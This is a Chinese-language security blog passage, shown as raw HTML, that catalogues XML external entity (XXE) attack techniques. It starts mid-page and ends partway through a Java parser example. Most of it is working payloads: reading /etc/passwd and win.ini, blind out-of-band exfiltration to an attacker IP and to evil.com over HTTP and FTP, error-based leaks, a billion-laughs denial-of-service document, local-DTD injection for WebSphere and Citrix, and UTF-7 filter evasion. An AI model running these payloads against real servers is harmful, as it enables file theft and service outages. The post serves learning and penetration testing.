class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还可以使用<strong>外部参数实体</strong>+<strong>外部实体</strong>进行文件读取。<br>攻击者发受害者<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>攻击者远程文件<code>evil.dtd</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">evil</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>" &gt;</span></span><br></pre></td></tr></table></figure></p><p>这个就绕过了个弯子，没太大意思。</p><h3 id="0x02-XXE盲注"><a href="#0x02-XXE盲注" class="headerlink" title="0x02.XXE盲注"></a>0x02.XXE盲注</h3><p>使用<strong>远程dtd读取</strong>，<strong>外部参数实体</strong>，<strong>外部实体</strong>进行文件读取。<br>条件：</p><ol><li>可以使用外部实体</li><li>可以使用远程dtd读取</li><li>可以使用外部参数实体</li><li>受害者与攻击者远程机网络可达</li><li>需要有远程攻击机放置xml文件以及接受结果</li></ol><p>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://47.102.137.160:1234/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p><blockquote><p>这一部构造参数实体 print，再执行得到send命名实体是必要的。命名实体内部不会解析参数实体</p></blockquote><p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>发送payload2（绕一圈引入）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://47.102.137.160:1234/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>这种盲注存在一个问题就是当读取的文件存在换行符时，读取文件结果只能读取到第一个换行符截止。暂时未找到解决方法。</p><p>但是报错注入没有这种问题。</p></blockquote><h4 id="一个疑问"><a href="#一个疑问" class="headerlink" title="一个疑问"></a>一个疑问</h4><p>为啥不能不读取远程，只发送至远程</p><blockquote><p>为什么需要引入外部dtd，不能够直接发给服务端dtd读取好文件，输出给外部服务器么？<br>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&gt; &lt;!DOCTYPE xxe [</span><br><span class="line">&gt; &lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt&quot;&gt;</span><br><span class="line">&gt; &lt;!ENTITY % print &quot;&lt;!ENTITY send SYSTEM &apos;http://47.102.137.160:1234/xxe.xml?c=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">&gt; %print;</span><br><span class="line">&gt; ]&gt;</span><br><span class="line">&gt; &lt;comment&gt;</span><br><span class="line">&gt; &lt;text&gt;&amp;send;&lt;/text&gt;</span><br><span class="line">&gt; &lt;/comment&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>这样就可以直接在外部读取到file<br>但事实是不可以的，主要是因为外部DTD允许我们在第二个实体中包含一个实体，但在内部DTD不允许这么做。<br>可以参考<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">文章</a><br>这篇文案还说明了当无法读取到外部dtd文件时，利用本地dtd文件进行参数覆盖，读取文件</p></blockquote><h3 id="0x03-报错注入"><a href="#0x03-报错注入" class="headerlink" title="0x03.报错注入"></a>0x03.报错注入</h3><p>其实和盲注一样，只需要最后发送信息至一个不存在的地方就会产生附带路径的报错。<br>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://xxxx.xx.xx.x/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p><p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>或者使用一个file://协议也可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">payload</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>”&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 ‘&lt;!ENTITY % external SYSTEM “file:///nothere/%payload;”&gt;’&gt; %param1; </span><br><span class="line">%external;</span><br></pre></td></tr></table></figure><h3 id="0x04-DOS攻击"><a href="#0x04-DOS攻击" class="headerlink" title="0x04.DOS攻击"></a>0x04.DOS攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol "lol"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x05-载体的扩展"><a href="#0x05-载体的扩展" class="headerlink" title="0x05.载体的扩展"></a>0x05.载体的扩展</h3><p>xml漏洞点不单单是一个参数输入，还可以是依托在其他格式的文件中，比如exel，pptx等。<br>参考<a href="https://xz.aliyun.com/t/5655" target="_blank" rel="noopener">先知文章</a></p><ol><li>改成zip后缀</li><li>修改\xl\worksheets\sheet1.xml</li><li>插入头，值内插入值</li></ol><h3 id="0x06-json格式转换"><a href="#0x06-json格式转换" class="headerlink" title="0x06.json格式转换"></a>0x06.json格式转换</h3><p>修改<code>Content-Type: application/json</code>为<code>Content-Type: application/xml</code>查看服务端是否支持xml解析。</p><h3 id="0x07本地DTD文件注入"><a href="#0x07本地DTD文件注入" class="headerlink" title="0x07本地DTD文件注入"></a>0x07本地DTD文件注入</h3><p>当目标机器不能访问我们放置恶意DTD文件的服务器，同时又不没有回显不能使用经典XEE时，以上所有办法都会失效。</p><p>这时候我们可以引用服务端已经存在的DTD文件，去进行一个DTD文件注入，引入恶意payload。</p><p>假设服务器上存在一个<strong>sip-app_1_0.dtd</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">condition</span> "<span class="attr">and</span> | <span class="attr">or</span> | <span class="attr">not</span> | <span class="attr">equal</span> | <span class="attr">contains</span> | <span class="attr">exists</span> | <span class="attr">subdomain-of</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">pattern</span> (%<span class="attr">condition</span>;)&gt;</span></span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>在这个已有的dtd文件中，定义了一个 %condition 参数实体，由于参数实体在dtd声明中都是简单的替换再解析，我们可以自定义一个%condition，然后就可以对<code>&lt;!ELEMENT pattern (%condition;)&gt;</code>这个语句进行注入。</p><blockquote><p>如果我们定义了两个同名的参数实体，那么只有第一个参数实体是有效的。</p></blockquote><p>构造如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % condition 'aaa)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT aa (bb'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对于% 进行了HTML编码</p><p>在调用%local_dtd时，sip-app_1_0.dtd才被引入，所以我们定义的%condition实体参数是第一个实体参数。</p></blockquote><p>调用 %local_dtd 就会执行我们拼接进入的语句，从而触发漏洞。</p><p>以上只是举个例子，知道原理后这种利用方式的关键在于如何找到对方服务器上可注入的dtd</p><h4 id="dtd-finder"><a href="#dtd-finder" class="headerlink" title="dtd-finder"></a>dtd-finder</h4><p>2019年7月，有国外大佬已经完美解决了这个问题，<a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html" target="_blank" rel="noopener">戳这里</a></p><p>并提供了工具<a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">dtd-finder</a>，工具中具有已知漏洞的dtd列表文件</p><p>在测试时只需要遍历存在已知漏洞的dtd文件，查看是否存在，存在的话照着参数利用即可。</p><p>除了以上工具中的可注入dtd列表，还有此处额外两个路径</p><p><strong>Citrix XenMobile Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Custom Multi-Platform IBM WebSphere Application</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &apos;Your DTD code&apos;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><h2 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h2><table><thead><tr><th>libxml2</th><th>PHP</th><th>JAVA</th><th>.NET</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar<br>expect</td><td>http<br>htps<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher<br>csp</td><td>file<br>http<br>https<br>ftp</td></tr></tbody></table><ul><li><p>php协议解析<br>`&lt;!ENTITY % file SYSTEM “php://filter/read=convert.base64-encode/resource=file:///D:/test.txt”&gt;</p></li><li><p>php如果开了PECL上的Expect扩展<br><code>&lt;!ENTITY content SYSTEM &quot;expect://dir .&quot;&gt;</code></p></li><li><p>netdoc协议解析<br><code>&lt;!ENTITY file SYSTEM &quot;netdoc:///var/www/html&quot;&gt;</code></p></li><li><p>jar协议文件上传至临时目录</p><p>jar协议格式：<code>jar:{url}!{path}</code></p><ol><li>提供错误路径得到报错信息，临时文件目录地址<br>jar:<a href="http://127.0.0.1:2014/xxe.jar!/1.php(错误路径)" target="_blank" rel="noopener">http://127.0.0.1:2014/xxe.jar!/1.php(错误路径)</a></li><li>使用<a href="https://github.com/pwntester/BlockingServer" target="_blank" rel="noopener">延长返回web服务器</a>，上面存放需要上传的文件，上传后会阻塞住保持临时文件一直存在。</li><li>使用netdoc协议查看临时文件目录下生成的临时文件，获取临时文件名。</li><li>再进行其他操作。</li></ol></li></ul><blockquote><p>JDK1.6u35 、JDK1.7u7 之后开始恢复对于gopher方案的支持<br>libxml是PHP对xml的支持</p></blockquote><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>如果服务端存在关键词过滤（如ENTITY），可以使用utf-7编码绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转变编码形式为utf-7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-7"</span> <span class="meta">?&gt;</span></span></span><br><span class="line">+ADwAIQ-DOCTYPE ANY +AFs-</span><br><span class="line">  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-7"</span> <span class="meta">?&gt;</span></span></span><br><span class="line">+ADwAIQ-DOCTYPE xxe +AFs</span><br><span class="line">+ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://47.102.137.160:8090/xxe.dtd+ACIAPg</span><br><span class="line">+AF0APg</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure><h2 id="解决文件跨行传输——ftp-amp-jdk1-7"><a href="#解决文件跨行传输——ftp-amp-jdk1-7" class="headerlink" title="解决文件跨行传输——ftp&amp;jdk1.7+"></a>解决文件跨行传输——ftp&amp;jdk1.7+</h2><p>在XXE盲注中，我们也提到通过http协议访问我们的服务器会只获取被读取的文件第一行。</p><p>参考<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">XXE OOB exploitation at Java 1.7+</a>这篇文章，在特定情况下我们可以解决这种困境。</p><p>在jdk1.7以前，其实是可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p><p>但是1.7之后，就修复了这个问题，会报错。</p><p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p><p>只要起一个<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="noopener">恶意的FTP服务器</a>，其他按照正常的XXE盲注打就好了。</p><p><code>http://evil.com/ext.dtd</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY &amp;#37; rrr SYSTEM 'ftp://evil.com:8000/%b;'&gt;"&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY % asd SYSTEM "http://evil.com/ext.dtd"&gt; </span></span><br><span class="line"><span class="meta">   %asd; </span></span><br><span class="line"><span class="meta">   %rrr; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS Java1.7.0_45@</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; CWD root:x:0:0:root:</span><br><span class="line">&gt; 230 more data please!</span><br><span class="line">&lt; CWD root:</span><br></pre></td></tr></table></figure><p>发出的ftp:// url格式也可以使用username:password的形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://%b:password@evil.com:8000</span><br></pre></td></tr></table></figure><p>但是显而易见这要求<code>%b</code>这个文件内容中不包含<code>:</code>不然就会，格式报错。所以还是前者比较好</p><h2 id="JAVA组件案例"><a href="#JAVA组件案例" class="headerlink" title="JAVA组件案例"></a>JAVA组件案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">DocumentHelper.parseText</span><br><span class="line">DocumentBuilder</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">rg.xml.sax.SAXParseExceptionpublicId</span><br></pre></td></tr></table></figure><p>以下案例均取自参考。</p><h3 id="0x01-DocumentBuilder"><a href="#0x01-DocumentBuilder" class="headerlink" title="0x01.DocumentBuilder"></a>0x01.DocumentBuilder</h3><p>java组件：javax.xml.parsers.*</p><p>组件漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">    DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">    String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">    <span class="string">"&lt;!ENTITY xxe SYSTEM 